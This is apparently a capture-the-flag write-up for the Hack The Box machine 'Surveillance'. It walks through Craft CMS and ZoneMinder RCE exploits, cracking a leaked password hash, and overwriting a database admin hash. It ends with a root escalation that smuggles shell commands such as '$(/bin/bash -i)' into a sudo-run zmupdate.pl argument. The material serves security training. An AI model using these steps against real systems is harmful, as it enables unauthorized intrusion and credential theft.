# Surveillance

<figure><img src="../../.gitbook/assets/image (397).png" alt=""><figcaption></figcaption></figure>

## Enumeration (0)

```bash
nmap -v -A -p- -sC -sV surveillance.htb
```

{% code overflow="wrap" %}
```
Nmap scan report for surveillance.htb (10.10.11.245)
Host is up (0.10s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/25%OT=22%CT=1%CU=42009%PV=Y%DS=2%DC=T%G=Y%TM=65DB
OS:0AF1%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(S
OS:P=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW
OS:7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%
OS:W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53AN
OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 44.738 days (since Thu Jan 11 10:57:59 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   62.19 ms  10.10.16.1
2   130.92 ms surveillance.htb (10.10.11.245)

NSE: Script Post-scanning.
Initiating NSE at 04:40
Completed NSE at 04:40, 0.00s elapsed
Initiating NSE at 04:40
Completed NSE at 04:40, 0.00s elapsed
Initiating NSE at 04:40
Completed NSE at 04:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 460.40 seconds
           Raw packets sent: 67493 (2.975MB) | Rcvd: 109571 (11.556MB)

```
{% endcode %}

### HTTP (port 80)

<figure><img src="../../.gitbook/assets/image (399).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (400).png" alt=""><figcaption></figcaption></figure>

#### Info

* Craft CMS (probably 4.4.14)
* Ubuntu
* Nginx 1.18.0

## Exploitation

The version 4.4.14 of Craft CMS is vulnerable to unauthenticated Remote Code Execution (RCE) CVE-2023-41892:

{% embed url="https://vulners.com/metasploit/MSF:EXPLOIT-LINUX-HTTP-CRAFTCMS_UNAUTH_RCE_CVE_2023_41892-" %}

{% embed url="https://putyourlightson.com/articles/critical-craft-cms-security-vulnerability" %}

The vulnerability affects Craft 4 _only_. Sites running Craft 3 are _not_ affected. This is because the vulnerability is in the `ConditionsController` class (used by the condition builder) that was added in version 4.0.0.

Run it:

<figure><img src="../../.gitbook/assets/image (401).png" alt=""><figcaption></figcaption></figure>

From this simple php webshell, obtain a more stable reverse shell:

We can use python3 to run the reverse shell:

<figure><img src="../../.gitbook/assets/image (402).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (403).png" alt=""><figcaption></figcaption></figure>

## Enumeration (1)

Exploring the wild, we can find under `backups` directory and interesting zip:

<figure><img src="../../.gitbook/assets/image (404).png" alt=""><figcaption></figcaption></figure>

Download on attacking machine and unzip it:

<figure><img src="../../.gitbook/assets/image (405).png" alt=""><figcaption></figcaption></figure>

Using an online tool in order to beautify the SQL code we find an `INSERT` statement SQL for `users` table:

<figure><img src="../../.gitbook/assets/image (406).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (407).png" alt=""><figcaption></figcaption></figure>

email: `admin@surveillance.htb`

password hash: `39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec`

The hash is probably a SHA256 mode:

<figure><img src="../../.gitbook/assets/image (408).png" alt=""><figcaption></figcaption></figure>

Crack it with hashcat:

```bash
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (409).png" alt=""><figcaption></figcaption></figure>

Password is: `starcraft122490`

## Privilege escalation (www-data -> matthew)

The login as `admin:starcraft122490` not work against CMS private area:

<figure><img src="../../.gitbook/assets/image (410).png" alt=""><figcaption></figcaption></figure>

But if we try to connect to SSH using `matthew` username and cracked password is a win:

<figure><img src="../../.gitbook/assets/image (411).png" alt=""><figcaption></figcaption></figure>

And the user.txt is here:\


<figure><img src="../../.gitbook/assets/image (412).png" alt=""><figcaption></figcaption></figure>

## Enumeration (2)

Enumerating manually we find other users that exist on this box:

<figure><img src="../../.gitbook/assets/image (413).png" alt=""><figcaption></figcaption></figure>

Using linpeas we find these useful infos:\


<figure><img src="../../.gitbook/assets/image (414).png" alt=""><figcaption></figcaption></figure>

Searching manually for this configuration file:

<figure><img src="../../.gitbook/assets/image (415).png" alt=""><figcaption></figcaption></figure>

Try entering the MySQL database locally using `zmuser` and password `ZoneMinderPassword2023` we find these useful infos inside `zm` database:

<figure><img src="../../.gitbook/assets/image (416).png" alt=""><figcaption></figcaption></figure>

admin | $2y$10$BuFy0QTupRjSWW6kEAlBCO6AlZ8ZPGDI8Xba5pi/gLr2ap86dxYd.



<figure><img src="../../.gitbook/assets/image (417).png" alt=""><figcaption></figcaption></figure>

We need to do an SSH tunnelling in order to access the remote ZoneMinder panel locally:

```bash
ssh -L 8888:localhost:8080 matthew@surveillance.htb
```

<figure><img src="../../.gitbook/assets/image (418).png" alt=""><figcaption></figcaption></figure>

Instead of cracking the password we change manually it by replacing the bcrypt hash.

Compute the new bcrypt hash for the password `P@ssword1!`:

```bash
htpasswd -bnBC 10 "" P@ssword1! | tr -d ':\n'
```

Then update the row of admin user:

{% code overflow="wrap" %}
```sql
UPDATE Users SET Password = '$2y$10$JzrNQiype70zQ47EKbsKr.j6aUbGpV43m0tJK1Y8lOBwevo4BU1jG' WHERE Id = 1;
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (419).png" alt=""><figcaption></figcaption></figure>

Login is successfully:

<figure><img src="../../.gitbook/assets/image (420).png" alt=""><figcaption></figcaption></figure>

After a while, the current session is invalidated and logout is forced.

We know that the version is 1.36.32 and googling for some sort of CVE we find that there is an anauthentication RCE by exploiting Snapshots command injection:

{% embed url="https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-72rg-h4vf-29gr" %}

<figure><img src="../../.gitbook/assets/image (421).png" alt=""><figcaption></figcaption></figure>

Using metasploit we can obtain a reverse shell as `zoneminder` user:

<figure><img src="../../.gitbook/assets/image (422).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (423).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (424).png" alt=""><figcaption></figcaption></figure>

Stabilize the session by spawning a pseudo-tty in python3:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")';
```

<figure><img src="../../.gitbook/assets/image (425).png" alt=""><figcaption></figcaption></figure>

## Privilege escalation (zoneminder -> root)

If we type `sudo -l` in the terminal we see a strange line of sudoers file:

```bash
User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

Here is what it means:

* `(ALL : ALL)`: Specifies the permissions to which this rule applies. In this case, `ALL` indicates that the rule applies to all users (`ALL`) and all groups (`ALL`).&#x20;
* `NOPASSWD`: Indicates that no password is required to execute the specified command.
* `/usr/bin/zm[a-zA-Z]*.pl`: The specific path to the command to which the rule applies. This command is /usr/bin/zm\[a-zA-Z].pl, where \[a-zA-Z] denotes any sequence of lowercase or uppercase letters.

In summary, this line allows all users and groups to run the command beginning with `/usr/bin/zm` followed by a sequence of letters (lowercase or uppercase) followed by .pl, and does not require them to enter a password to do so.

List all the possible PERL script under `/usr/bin` in order to analyze the code and spot the vuln:

<figure><img src="../../.gitbook/assets/image (426).png" alt=""><figcaption></figcaption></figure>

Scripts are owned by root and are only executable/readable by other users, so we have to inspect the parameters of these binaries. Download all the binaries using `download` command of meterpreter:

```bash
download /usr/bin/zm*.pl
```

<figure><img src="../../.gitbook/assets/image (427).png" alt=""><figcaption></figcaption></figure>

After analyzing each parameter of each PERL script downloaded, we find a possible miscoding in `zmupdate.pl` script.

<figure><img src="../../.gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (430).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (431).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (432).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (433).png" alt=""><figcaption></figcaption></figure>

If we pass as user the following string `$(/bin/bash -i)` we obtain a shell because:

* `$(...)`: This is the syntax of "<mark style="color:yellow;">command substitution</mark>" in bash. Anything inside the parentheses is executed as a separate command, and its output is captured and used as input for the external command.
* `/bin/bash -i`: This is the command that is executed inside the brackets. /bin/bash is the full path to the bash shell, while the -i (or --interactive) option indicates to run the shell in interactive mode, which means that an interactive interface is provided for the user, allowing for example, auto-completion of commands.

Due to a failure to sanitize the input, `qx()` executes the command but anything specified within `$(...)` takes precedence in execution and thus a shell is spawned.

Dump the root.txt flag:

{% code overflow="wrap" fullWidth="false" %}
```bash
sudo /usr/bin/zmupdate.pl --version=1 --user='$(cat /root/root.txt)' --pass=fake
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (398).png" alt=""><figcaption></figcaption></figure>
